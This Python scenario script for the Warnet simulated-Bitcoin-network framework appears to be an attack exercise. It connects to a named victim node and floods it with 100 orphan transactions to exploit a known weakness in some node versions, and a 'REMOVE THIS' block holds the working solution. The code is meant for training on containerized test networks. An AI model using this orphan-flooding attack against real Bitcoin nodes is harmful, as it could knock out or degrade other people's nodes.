#!/usr/bin/env python3

import socket
from time import sleep

from commander import Commander

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import hash256, msg_tx, CTransaction
from test_framework.p2p import MAGIC_BYTES, P2PInterface
from test_framework.wallet import (
    MiniWallet,
    MiniWalletMode,
)

from test_framework.authproxy import JSONRPCException

from test_framework.script_util import key_to_p2pk_script


def get_signet_network_magic_from_node(node):
    template = node.getblocktemplate({"rules": ["segwit", "signet"]})
    challenge = template["signet_challenge"]
    challenge_bytes = bytes.fromhex(challenge)
    data = len(challenge_bytes).to_bytes() + challenge_bytes
    digest = hash256(data)
    return digest[0:4]


# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.
class Orphan50(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate network reconnaissance using a scenario and P2PInterface"
        )
        parser.usage = "warnet run /path/to/reconnaissance.py"

    # Scenario entrypoint
    def run_test(self):
        self.log.info("Starting orphan scenario")

        # We pick a node on the network to attack
        # We know this one is vulnderable to 50 orphans based on it's subver
        # Change this to your teams colour if running in the battleground
        victim = "tank-0002-red.default.svc"

        # regtest or signet
        chain = self.nodes[0].chain

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(victim)
        if chain == "regtest":
            dstport = 18444
        if chain == "signet":
            dstport = 38333
            MAGIC_BYTES["signet"] = get_signet_network_magic_from_node(self.nodes[0])

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {victim}")
        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        node0_p2p = P2PInterface()
        node0_p2p.peer_connect(
            dstaddr=self.nodes[0].rpchost,
            dstport=dstport,
            net="signet",
            timeout_factor=1,
        )()
        node0_p2p.wait_until(lambda: attacker.is_connected, check_connected=False)

        # the first node as listed in `warnet status`
        # would be miner in scrimmage and most likely armada-0 in battleground
        self.wallet = MiniWallet(self.nodes[0], mode=MiniWalletMode.RAW_P2PK)
        # Change this number to prevent someone from spending your coins
        private_key = 5390
        self.wallet._priv_key.set((private_key).to_bytes(32, "big"), True)
        pub_key = self.wallet._priv_key.get_pubkey()
        self.wallet._scriptPubKey = key_to_p2pk_script(pub_key.get_bytes())

        # Can only generate on Scrimmage as it is using OP_TRUE as the signet challenge
        # mining_worked = True
        # self.log.info("Mining blocks to generate UTXOs")
        # try:
        #     for _ in range(100):
        #         self.generate(self.wallet, 100)
        #         self.log.info(f"Mining attempt, {i+1} out of 100")
        # except Exception:
        #     pass

        miniwallet_balance = self.wallet.get_balance()
        self.log.info(f"MiniWallet Balance: {miniwallet_balance}")

        # if balance is 0 then self mining did not work as we are probably running on Battleground
        # will need to request some funds from the faucet
        # if miniwallet_balance == 0:
        try:
            self.nodes[0].createwallet("miner", False, None, None, False, True, False)
        except JSONRPCException:
            pass

        try:
            self.nodes[0].loadwallet("miner")
        except JSONRPCException:
            pass

        wallet = self.nodes[0].get_wallet_rpc("miner")
        unspent = wallet.listunspent()
        if not unspent:
            self.log.info("Do not have any funds with which to load into MiniWallet")
            address = wallet.getnewaddress()
            self.log.info(f"Request the faucet to send funds to {address}")
            self.log.info("Then rerun this scenario")
            return

        for utxo in unspent:
            self_transfer_tx = self.wallet.create_self_transfer_multi(
                utxos_to_spend=[
                    {
                        "txid": utxo["txid"],
                        "vout": utxo["vout"],
                        "value": utxo["amount"],
                    }
                ],
                num_outputs=100,
            )
            # sign it
            signed = wallet.signrawtransactionwithwallet(
                self_transfer_tx["tx"].serialize().hex()
            )
            self.nodes[0].sendrawtransaction(signed["hex"])
            self.log.info(
                f"Spent UTXO {utxo['txid']}:{utxo['vout']} from orphan wallet into MiniWallet"
            )

        sleep(5)
        self.wallet.rescan_utxos()

        # for i in range(100):
        #     self.generate(self.wallet, 100)
        #     self.log.info(f"Mining attempt, {i+1} out of 100")
        miniwallet_utxos = self.wallet.get_utxos(mark_as_spent=False)
        self.log.info(f"MiniWallet UTXOs: {miniwallet_utxos}")

        for i in range(100):
            # make a transaction that doesn't arrive

            # make a transaction that spends the output of the above transaction

            # send the orphan, perhaps like this:
            # attacker.send_and_ping(msg_tx(tx_orphan["tx"]))
            self.log.info(f"Sent orphan {i+1} of 100")

            # REMOVE THIS
            tx_parent_doesnt_arrive = self.wallet.create_self_transfer()
            utxo_to_spend = {
                "txid": tx_parent_doesnt_arrive["txid"],
                "vout": tx_parent_doesnt_arrive["new_utxo"]["vout"],
                "value": tx_parent_doesnt_arrive["new_utxo"]["value"],
            }
            tx_orphan = self.wallet.create_self_transfer(
                utxo_to_spend=utxo_to_spend, confirmed_only=False
            )

            attacker.send_and_ping(msg_tx(tx_orphan["tx"]))
            # END REMOVE


def main():
    Orphan50().main()


if __name__ == "__main__":
    main()
